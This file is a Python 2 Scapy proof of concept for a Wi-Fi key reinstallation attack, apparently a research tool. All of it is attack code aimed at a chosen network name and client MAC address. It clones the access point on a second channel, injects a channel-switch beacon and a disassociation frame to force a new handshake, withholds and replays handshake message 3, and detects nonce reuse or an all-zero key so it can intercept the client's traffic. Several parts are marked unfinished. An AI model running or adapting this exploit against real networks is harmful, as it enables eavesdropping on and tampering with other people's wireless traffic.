#!/usr/bin/env python2
from scapy.all import *
import sys, os, struct, time, argparse
from datetime import datetime

CHANNEL_AP    = 1                   # Channel of the original AP
CHANNEL_CLONE = 11                  # Channel where the original AP will be cloned on
IFACE_MON     = "wlan2mon"	    # Interface on same channel as the real AP

IEEE_TLV_TYPE_SSID = 0
IEEE_TLV_TYPE_CSA  = 37

WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY = 4


#### Basic output and logging functionality ####

DEBUG, INFO, STATUS, WARNING, ERROR = range(5)
COLORCODES = { "gray"  : "\033[0;37m",
               "green" : "\033[0;32m",
               "orange": "\033[0;33m",
               "red"   : "\033[0;31m" }

# TODO: command-line argument to change this
loglevel = INFO
def log(level, msg, color=None, showtime=True):
	if level < loglevel: return
	if level == DEBUG   and color is None: color="gray"
	if level == WARNING and color is None: color="orange"
	if level == ERROR   and color is None: color="red"
	print (datetime.now().strftime('[%H:%M:%S] ') if showtime else " "*11) + COLORCODES.get(color, "") + msg + "\033[1;0m"


#### Packet Processing Functions ####

def get_eapol_msgnum(p):
	FLAG_PAIRWISE = 0b0000001000
	FLAG_ACK      = 0b0010000000
	FLAG_SECURE   = 0b1000000000

	if not EAPOL in p: return 0

	keyinfo = str(p[EAPOL])[5:7]
	flags = struct.unpack(">H", keyinfo)[0]
	if flags & FLAG_PAIRWISE:
		# 4-way handshake
		if flags & FLAG_ACK:
			# sent by server
			if flags & FLAG_SECURE: return 3
			else: return 1
		else:
			# sent by server
			if flags & FLAG_SECURE: return 4
			else: return 2

	return 0
			

#### Man-in-the-middle Setup Code ####

def xorstr(lhs, rhs):
	return "".join([chr(ord(lb) ^ ord(rb)) for lb, rb in zip(lhs, rhs)])

def recv_dot11(socket):
	p = socket.recv()
	if p == None or not Dot11 in p: return None
	# Hack: ignore frames that we just injected and are echoed back by the kernel
	if p[Dot11].FCfield & 0x20 != 0:
		log(DEBUG, "Ignoring echoed injected frame: %s (0x%02X)" % (dot11_to_str(p), p[Dot11].FCfield))
		return None
	return p[Dot11]

def send_dot11(socket, p):
	# Hack: set the More Data flag so we can detect injected frames
	p[Dot11].FCfield |= 0x20
	socket.send(RadioTap()/p)

def dot11_get_iv(p):
	"""Scapy can't handle Extended IVs, so do this properly ourselves"""
	if Dot11WEP not in p:
		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
		return 0

	wep = p[Dot11WEP]
	if wep.keyid & 32:
		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
	else:
		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)

def dot11_to_str(p):
	if Dot11Beacon in p:      return "Beacon(TSF=%d)" % p[Dot11Beacon].timestamp
	elif Dot11ProbeReq in p:  return "ProbeReq"
	elif Dot11ProbeResp in p: return "ProbeResp"
	elif Dot11Auth in p:      return "Auth"
	elif Dot11Deauth in p:    return "Deauth"
	elif Dot11AssoReq in p:   return "AssoReq"
	elif Dot11AssoResp in p:  return "AssoResp"
	elif Dot11Disas in p:     return "Disas"
	elif Dot11WEP in p:       return "EncryptedData(IV=%d)" % dot11_get_iv(p)
	elif EAPOL in p:
		if get_eapol_msgnum(p) != 0: return "EAPOL msg%d" % get_eapol_msgnum(p)
		else:                        return repr(p)
	return repr(p)

def print_rx(level, name, p):
	log(level, "%s: %s -> %s: %s" % (name, p.addr2, p.addr1, dot11_to_str(p)), color="orange" if Dot11Deauth in p else None)

def construct_csa():
	switch_mode = 1		# STA should not Tx untill switch is completed
	new_chan_num = 6	# Channel it should switch to -- FIXME do not hardcode this
	switch_count = 1	# Immediately make the station switch

	# Contruct the IE
	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
	return struct.pack("<BB", IEEE_TLV_TYPE_CSA, len(payload)) + payload


def append_csa(p):
	el = p[Dot11Elt]
	prevel = None
	while isinstance(el, Dot11Elt):
		prevel = el
		el = el.payload

	prevel.payload = construct_csa()

	return p


def get_tlv_value(p, type):
	if not Dot11Elt in p: return None
	el = p[Dot11Elt]
	while isinstance(el, Dot11Elt):
		if el.ID == IEEE_TLV_TYPE_SSID:
			return el.info
	return None


class ClientState():
	def __init__(self, macaddr):
		self.macaddr = macaddr

		self.is_mitmed = False
		self.previv = None
		self.prevkeystream = None
		self.msg3s = []
		self.msg4 = None


class DejaVuAttack():
	def __init__(self, nic_real, nic_rogue, ssid, clientmac=None):
		self.nic_real = nic_real
		self.nic_rogue = nic_rogue
		self.ssid = ssid
		self.beacon = None
		self.apmac = None

		# This is set in case of targeted attacks
		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()

		self.sock_real  = None
		self.sock_rogue = None
		self.clients = dict()

	def find_beacon(self, ssid):
		p = sniff(count=1, timeout=2, lfilter=lambda p: get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
		if p is None or len(p) < 1:
			raise Exception("No beacon received of network <%s>. Is monitor mode working, and are you on the AP's channel?" % ssid)
		self.beacon = p[0][Dot11]
		self.apmac = self.beacon.addr2

	def intercept_sentby_client(self, p, client):
		if client and not client.is_mitmed: return None

		eapolnum = get_eapol_msgnum(p)
		if eapolnum == 4:
			client.msg4 = p
			log(STATUS, "Not forwarding EAPOL msg4 (TODO: Track reception?)", color="green")
			return None
		if Dot11WEP in p:
			# scapy incorrectly puts Extended IV into wepdata field, so skip those bytes				
			plaintext = "\xaa\xaa\x03\x00\x00\x00\x88\x8e"
			encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
			keystream = xorstr(plaintext, encrypted)

			iv = dot11_get_iv(p)
			if client.previv == iv:
				log(STATUS, "Nonce reuse detected (IV=%d)!" % iv, color="green", showtime=False)

				if keystream != client.prevkeystream:
					# TODO: Don't send this frame for the subsequent IV reuses in this attack session!!
					log(STATUS, "Client likely installed all-zero key, now directly MitM'ing", color="green", showtime=False)

					log(STATUS, "Forwarding Msg4 to rogue AP to fully accept client", color="green", showtime=False)
					send_dot11(self.sock_rogue, client.msg4)

					client.forward = False
				
				else:
					log(STATUS, "Normal Key Reinstallation Attack, finishing handshake at AP side", color="green", showtime=False)
					send_dot11(self.sock_real, client.msg4)

			client.previv = iv
			client.prevkeystream = keystream
		return p

	def intercept_sentby_ap(self, p, client=None):
		if client and not client.is_mitmed: return None

		eapolnum = get_eapol_msgnum(p)
		if not client is None and eapolnum == 3:
			client.msg3s.append(p)
			# FIXME: This may cause a timeout on the client side
			if len(client.msg3s) >= 3:
				for p in client.msg3s:
					send_dot11(self.sock_rogue, p)
				client.msg3s = []
				log(STATUS, "Got 3rd EAPOL msg3, will now forward all three msg3's", color="green", showtime=False)
			else:
				log(STATUS, "Not forwarding EAPOL msg3 (%d now queued)" % len(client.msg3s), color="green", showtime=False)
			return None
		return p

	def handle_rx_realchan(self):
		p = recv_dot11(self.sock_real)
		if p == None: return


		# 1. Track wether the client is directly sending to the AP on the real channel
		client = self.clients.get(p.addr2)
		if client and p.addr1 == self.apmac:
			print_rx(INFO, "Real channel ", p)
			if Dot11Auth in p:
				log(WARNING, "Client %s is connecting to the AP on the real channel. MitM failed." % client.macaddr)
				client.is_mitmed = False

		# 2. Now focus on data send by the real AP to a client we are MitM'ing or want to target
		if p.addr2 != self.apmac: return
		# FIXME: We are currently not forwarding beacon. Is this what we want? Or more simple hostapd?
		if Dot11Beacon in p: print_rx(DEBUG, "Real channel ", p)

		client = self.clients.get(p.addr1)
		if client is None: return

		print_rx(INFO, "Real channel ", p)
		forward = self.intercept_sentby_ap(p, client)
		if forward is not None and p.addr1 != "ff:ff:ff:ff:ff:ff":
			send_dot11(self.sock_rogue, forward)

	def handle_rx_roguechan(self):
		p = recv_dot11(self.sock_rogue)
		if p == None: return

		# 1. Handle frames sent by the rogue AP to the client
		client = self.clients.get(p.addr1)
		if client: print_rx(INFO, "Rogue channel", p)

		# 2. Handle frames sent by a client we want to target or are MitM'ing
		client = self.clients.get(p.addr2)
		if client is None: return

		print_rx(INFO, "Rogue channel", p)
		if Dot11Auth in p:
			log(STATUS, "Successfully MitM'ed client %s" % client.macaddr, color="green")
			client.is_mitmed = True

		# TODO: The intercept functions can forward frames themselves??
		forward = self.intercept_sentby_client(p, client)
		if forward is not None: send_dot11(self.sock_real, forward)

	def handle_frames(self):
		i = 0
		while True:
			sel = select([self.sock_rogue, self.sock_real], [], [])

			if self.sock_real in sel[0]:
				self.handle_rx_realchan()

			if self.sock_rogue in sel[0]:
				self.handle_rx_roguechan()

	def run(self):
		# Make sure to use a recent backports driver package so we can indeed
		# capture and inject packets in monitor mode.
		self.sock_real  = conf.L2socket(type=ETH_P_ALL, iface=self.nic_real)
		self.sock_rogue = conf.L2socket(type=ETH_P_ALL, iface=self.nic_rogue)

		# Test monitor mode and get MAC address of the network
		self.find_beacon(self.ssid)
		log(STATUS, "Target network detected: " + self.apmac, color="green")

		# Inject a CSA beacon to push victims to our channel -- FIXME: dynamic channel
		csabeacon = append_csa(self.beacon)
		send_dot11(self.sock_real, csabeacon)
		log(STATUS, "Injected CSA beacon", color="green")

		# Let the victim switch, then inject a Disassociation frame to trigger a new handshake
		time.sleep(2)
		p = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
		send_dot11(self.sock_rogue, p)
		log(STATUS, "Injected Disassociation", color="green")

		# Only attack the specific client that was listed
		self.clients[self.clientmac] = ClientState(self.clientmac)

		# Continue attack by monitoring both channels and performing needed actions
		self.handle_frames()


if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Key Reinstallation Attacks', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
	parser.add_argument('nic_real_ap', help='Wireless monitor interface that will listen on the channel of the target AP.')
	parser.add_argument('nic_rogue_ap', help='Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.')
	parser.add_argument('ssid', help='The SSID of the network to attack.')
	parser.add_argument('clientmac', help='The MAC address of the client that will be attacked.')
	args = parser.parse_args()

	dejavu = DejaVuAttack(args.nic_real_ap, args.nic_rogue_ap, args.ssid, args.clientmac)
	dejavu.run()


